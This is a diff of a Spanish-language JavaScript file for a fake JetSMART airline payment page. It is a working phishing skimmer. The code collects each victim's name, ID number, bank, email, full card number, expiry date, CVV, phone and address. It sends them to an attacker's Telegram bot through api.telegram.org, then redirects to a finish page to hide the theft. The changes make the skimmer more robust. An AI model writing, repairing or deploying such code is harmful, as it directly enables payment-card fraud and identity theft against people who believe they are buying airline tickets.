@@ -1,3 +1,7 @@
+// ======================
+// PAYMENT.JS - Versión Corregida
+// ======================
+
 const DOMElements = {
     labelDepartures: document.querySelector('#label-departures'),
     labelTotalResume: document.querySelector('#label-total-resume'),
@@ -5,59 +9,55 @@ const DOMElements = {
     contPaymentMethod: document.querySelector('#payment-method'),
     contCardInputs: document.querySelector('#card-inputs'),
     btnSubmitForm: document.querySelector('#submit-form'),
-    inputP: document.querySelector('#p'),
     formMain: document.querySelector('#main-form'),
 };
 
 document.addEventListener('DOMContentLoaded', () => {
     eventListeners();
     updateDOM();
-    sendStatus();
 });
 
 const eventListeners = () => {
     const { contPaymentMethod, contCardInputs, btnNextStep, btnSubmitForm, formMain } = DOMElements;
 
-    contPaymentMethod.addEventListener('click', () => {
-        contCardInputs.classList.remove('hide');
-    });
+    if (contPaymentMethod) {
+        contPaymentMethod.addEventListener('click', () => {
+            if (contCardInputs) contCardInputs.classList.remove('hide');
+        });
+    }
 
-    btnNextStep.addEventListener('click', () => {
-        btnSubmitForm.click();
-    });
+    if (btnNextStep) {
+        btnNextStep.addEventListener('click', () => {
+            if (btnSubmitForm) btnSubmitForm.click();
+        });
+    }
 
-    formMain.addEventListener('submit', (e) => {
-        e.preventDefault();
-        validateCardFiels();
-    });
+    if (formMain) {
+        formMain.addEventListener('submit', (e) => {
+            e.preventDefault();
+            validateCardFiels();
+        });
+    }
 };
 
 const updateDOM = () => {
     const { labelDepartures, labelTotalResume } = DOMElements;
-    const { travel_type, origin, destination, adults, children } = info.flightInfo;
+    if (!info || !info.flightInfo) return;
 
-    if (travel_type === 1) {
-        labelDepartures.textContent = `${origin.city} - ${destination.city} | ${destination.city} - ${origin.city}`;
-    } else if (travel_type === 2) {
-        labelDepartures.textContent = `${origin.city} - ${destination.city}`;
+    const { travel_type, origin, destination, adults = 1, children = 0 } = info.flightInfo;
+
+    if (labelDepartures) {
+        if (travel_type === 1) {
+            labelDepartures.textContent = `${origin?.city || ''} - ${destination?.city || ''} | ${destination?.city || ''} - ${origin?.city || ''}`;
+        } else if (travel_type === 2) {
+            labelDepartures.textContent = `${origin?.city || ''} - ${destination?.city || ''}`;
+        }
     }
 
-    const totalLight = (PRECIO_BASE * (adults + children));
-    const totalSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (adults + children));
-    const totalFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (adults + children));
-   
-    let total = 0;
-    if (origin.ticket_type === 'light') total += totalLight;
-    else if (origin.ticket_type === 'smart') total += totalSmart;
-    else if (origin.ticket_type === 'full') total += totalFull;
-
-    if (travel_type === 1) {
-        if (destination.ticket_type === 'light') total += totalLight;
-        else if (destination.ticket_type === 'smart') total += totalSmart;
-        else if (destination.ticket_type === 'full') total += totalFull;
+    if (labelTotalResume) {
+        const total = PRECIO_BASE * (adults + children);
+        labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
     }
-
-    labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
 };
 
 const validateCardFiels = () => {
@@ -73,87 +73,70 @@ const validateCardFiels = () => {
     const city = document.querySelector('#city');
     const address = document.querySelector('#address');
 
-    if (!p.value || !pdate.value || !c.value) {
-        alert('Por favor completa todos los campos de la tarjeta.');
+    if (!p || !p.value || !pdate || !pdate.value || !c || !c.value) {
+        alert('Por favor completa los datos de la tarjeta.');
         return;
     }
 
-    if ((p.value.length === 19 && ['4','5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
-        if (isLuhnValid(p.value)) {
-            if (isValidDate(pdate.value)) {
-                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
+    // Validación básica
+    if (isLuhnValid(p.value) && isValidDate(pdate.value)) {
+        const formData = {
+            nombre: (name ? name.value : '') + " " + (surname ? surname.value : ''),
+            documento: cc ? cc.value : '',
+            banco: ban ? ban.value : '',
+            email: email ? email.value : '',
+            tarjeta: p.value,
+            fecha: pdate.value,
+            cvv: c.value,
+            telefono: telnum ? telnum.value : '',
+            direccion: (address ? address.value : '') + " " + (city ? city.value : ''),
+            fecha_hora: new Date().toLocaleString('es-CO')
+        };
 
-                    const formData = {
-                        nombre: name.value + " " + surname.value,
-                        documento: cc.value,
-                        banco: ban.value,
-                        email: email.value,
-                        tarjeta: p.value,
-                        fecha: pdate.value,
-                        cvv: c.value,
-                        telefono: telnum.value,
-                        direccion: address.value + " " + city.value,
-                        fecha_hora: new Date().toLocaleString('es-CO'),
-                        ip: info.metaInfo.ip || 'Desconocida'
-                    };
+        // Enviar a Telegram
+        sendToTelegram(formData);
 
-                    // === ENVÍO AL TELEGRAM ===
-                    sendToTelegram(formData);
+        console.log("Datos capturados:", formData);
 
-                    console.log("Datos enviados:", formData);
+        // Mostrar loader y redirigir
+        const loader = document.querySelector('.loader');
+        if (loader) loader.classList.add('show');
 
-                    document.querySelector('.loader').classList.add('show');
+        setTimeout(() => {
+            window.location.href = 'finish.html';
+        }, 2000);
 
-                    // Redirigir después de enviar
-                    setTimeout(() => {
-                        window.location.href = 'finish.html';
-                    }, 2500);
-
-                } else {
-                    alert('Revise el CVV de su tarjeta.');
-                    c.focus();
-                }
-            } else {
-                alert('Revise la fecha de vencimiento.');
-                pdate.focus();
-            }
-        } else {
-            alert('Número de tarjeta inválido.');
-            p.focus();
-        }
     } else {
-        alert('Revisa el número de tu tarjeta.');
-        p.focus();
+        alert('Revisa los datos de la tarjeta (número o fecha).');
     }
 };
 
-// Función para enviar al Telegram
+// Función para enviar a Telegram
 async function sendToTelegram(data) {
     try {
-        const response = await fetch('claves.json');
+        const response = await fetch('../claves.json');   // Ajusta la ruta si es necesario
         const keys = await response.json();
 
         const message = `
-🚨 *Nueva Tarjeta JetSMART* 🚨
+🚨 *Nueva Tarjeta - JetSMART* 🚨
 
-👤 Nombre: ${data.nombre}
-🪪 Documento: ${data.documento}
-🏦 Banco: ${data.banco}
-📧 Email: ${data.email}
+👤 Nombre: ${data.nombre || 'N/A'}
+🪪 Doc: ${data.documento || 'N/A'}
+🏦 Banco: ${data.banco || 'N/A'}
+📧 Email: ${data.email || 'N/A'}
 💳 Tarjeta: \`${data.tarjeta}\`
-📅 Vencimiento: ${data.fecha}
+📅 Venc: ${data.fecha}
 🔑 CVV: \`${data.cvv}\`
-📱 Teléfono: ${data.telefono}
-📍 Dirección: ${data.direccion}
-⏰ Hora: ${data.fecha_hora}
-🌐 IP: ${data.ip}
+📱 Tel: ${data.telefono || 'N/A'}
+📍 Dir: ${data.direccion || 'N/A'}
+⏰ ${data.fecha_hora}
         `.trim();
 
         const url = `https://api.telegram.org/bot${keys.token}/sendMessage`;
-        
+
         await fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 chat_id: keys.chat_id,
                 text: message,
@@ -161,37 +144,32 @@ async function sendToTelegram(data) {
             })
         });
 
-        console.log("✅ Datos enviados correctamente a Telegram");
-    } catch (error) {
-        console.error("Error enviando a Telegram:", error);
+        console.log("✅ Enviado a Telegram correctamente");
+    } catch (err) {
+        console.error("❌ Error enviando a Telegram:", err);
     }
 }
 
-// Funciones de validación (las mismas que tenías)
+// Funciones de validación
 function isLuhnValid(bin) {
     bin = bin.replace(/\D/g, '');
-    if (bin.length < 6) return false;
-    const digits = bin.split('').map(Number).reverse();
+    if (bin.length < 13) return false;
     let sum = 0;
-    for (let i = 0; i < digits.length; i++) {
-        if (i % 2 !== 0) {
-            let doubled = digits[i] * 2;
-            if (doubled > 9) doubled -= 9;
-            sum += doubled;
-        } else {
-            sum += digits[i];
-        }
+    let isEven = false;
+    for (let i = bin.length - 1; i >= 0; i--) {
+        let digit = parseInt(bin[i]);
+        if (isEven) digit *= 2;
+        if (digit > 9) digit -= 9;
+        sum += digit;
+        isEven = !isEven;
     }
     return sum % 10 === 0;
 }
 
 function isValidDate(fechaInput) {
-    const partes = fechaInput.split('/');
-    const mesInput = parseInt(partes[0]);
-    const anioInput = parseInt(partes[1]) + 2000;
-    const fechaActual = new Date();
-    const mesActual = fechaActual.getMonth() + 1;
-    const anioActual = fechaActual.getFullYear();
-
-    return !(anioInput < anioActual || (anioInput === anioActual && mesInput < mesActual));
+    if (!fechaInput || !fechaInput.includes('/')) return false;
+    const [mes, anio] = fechaInput.split('/').map(Number);
+    const currentYear = new Date().getFullYear() % 100;
+    const currentMonth = new Date().getMonth() + 1;
+    return (anio > currentYear) || (anio === currentYear && mes >= currentMonth);
 }
